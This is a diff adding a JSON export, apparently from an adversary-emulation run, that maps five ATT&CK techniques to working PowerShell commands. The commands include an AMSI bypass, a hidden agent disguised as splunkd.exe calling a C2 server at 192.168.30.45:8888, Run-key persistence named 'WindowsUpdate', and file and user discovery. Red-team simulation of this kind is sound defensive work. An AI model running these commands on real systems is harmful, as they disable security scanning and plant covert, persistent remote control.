@@ -1,0 +1,151 @@
+{
+  "operation_id": "b5989196-5d0b-4eb8-9571-0dc52e4c654b",
+  "operation_name": "apt-sim-20260402-100632",
+  "technique_count": 5,
+  "techniques": [
+    {
+      "technique_id": "T1005",
+      "technique_name": "Sensitive File Discovery",
+      "tactic": "collection",
+      "ability_id": "collection_files",
+      "ability_name": "Sensitive File Discovery",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "0",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "psh,proc,cmd",
+        "{'name': 'psh', 'platform': 'windows', 'command': 'Get-ChildItem C:\\\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\\n', 'code': None, 'language': None, 'build_target': None, 'payloads': [], 'uploads': [], 'timeout': 120, 'parsers': [], 'cleanup': [], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n"
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "T1071.001",
+      "technique_name": "Internal C2",
+      "tactic": "command-and-control",
+      "ability_id": "c2_internal",
+      "ability_name": "Internal C2",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "1",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "psh,proc,cmd",
+        "{'name': 'psh', 'platform': 'windows', 'command': 'Start-Process C:\\\\Users\\\\Public\\\\splunkd.exe `\\n-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `\\n-WindowStyle Hidden\\n', 'code': None, 'language': None, 'build_target': None, 'payloads': [], 'uploads': [], 'timeout': 60, 'parsers': [], 'cleanup': [], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `\n-WindowStyle Hidden\n"
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "T1562.001",
+      "technique_name": "AMSI Bypass",
+      "tactic": "defense-evasion",
+      "ability_id": "amsi_bypass",
+      "ability_name": "AMSI Bypass",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "0",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "psh,proc,cmd",
+        "{'name': 'psh', 'platform': 'windows', 'command': \"$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\\n$f=$s.GetField('amsiInitFailed','NonPublic,Static');\\n$f.SetValue($null,$true)\\n\", 'code': None, 'language': None, 'build_target': None, 'payloads': [], 'uploads': [], 'timeout': 60, 'parsers': [], 'cleanup': [], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$f=$s.GetField('amsiInitFailed','NonPublic,Static');\n$f.SetValue($null,$true)\n"
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "T1033",
+      "technique_name": "User Discovery",
+      "tactic": "discovery",
+      "ability_id": "discovery_users",
+      "ability_name": "User Discovery",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "1",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "psh,proc,cmd",
+        "{'name': 'psh', 'platform': 'windows', 'command': 'whoami\\nwhoami /priv\\nnet user\\nnet localgroup administrators\\n', 'code': None, 'language': None, 'build_target': None, 'payloads': [], 'uploads': [], 'timeout': 60, 'parsers': [], 'cleanup': [], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n"
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "T1547.001",
+      "technique_name": "Registry Persistence",
+      "tactic": "persistence",
+      "ability_id": "persistence_registry",
+      "ability_name": "Registry Persistence",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "1",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "psh,proc,cmd",
+        "{'name': 'psh', 'platform': 'windows', 'command': 'New-ItemProperty -Path \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" `\\n-Name \"WindowsUpdate\" `\\n-Value \"C:\\\\Users\\\\Public\\\\splunkd.exe\" -Force\\n', 'code': None, 'language': None, 'build_target': None, 'payloads': [], 'uploads': [], 'timeout': 60, 'parsers': [], 'cleanup': [], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `\n-Name \"WindowsUpdate\" `\n-Value \"C:\\Users\\Public\\splunkd.exe\" -Force\n"
+      ],
+      "d3fend": []
+    }
+  ],
+  "attack_ids": [
+    "T1005",
+    "T1033",
+    "T1071.001",
+    "T1547.001",
+    "T1562.001"
+  ],
+  "d3fend_map": {
+    "T1005": [],
+    "T1033": [],
+    "T1071.001": [],
+    "T1547.001": [],
+    "T1562.001": []
+  }
+}
